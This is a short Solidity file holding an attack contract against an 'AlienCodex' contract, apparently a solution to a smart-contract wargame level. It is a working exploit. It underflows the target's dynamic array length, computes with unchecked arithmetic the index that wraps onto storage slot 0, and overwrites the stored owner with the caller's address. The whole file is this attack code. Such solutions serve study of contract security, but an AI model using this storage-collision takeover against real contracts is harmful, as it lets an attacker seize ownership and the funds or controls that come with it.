// SPDX-License-Identifier: MIT
pragma solidity^0.8.2;

interface IAlienCodex {
    function makeContact()external;
    function revise(uint, bytes32)external;
    function retract()external;
}

contract Attack{
    function attack(IAlienCodex alien)external{
        alien.makeContact();
        alien.retract();
        uint ownerSlot;

        //allowing underflow/overflow
        unchecked{
            //beacuse the storage slot of the owner in AlienCodex contract is 0
            //we have to find the slot number of the mapping that overlaps the owner 
            //0 ---> owners slot
            //uint(keccak256(abi.encode(1))) ---> hashed mappings slot
            ownerSlot= 0- uint(keccak256(abi.encode(1)));
        }
        
        alien.revise(ownerSlot,bytes32(uint256(uint160(msg.sender))));
    }
}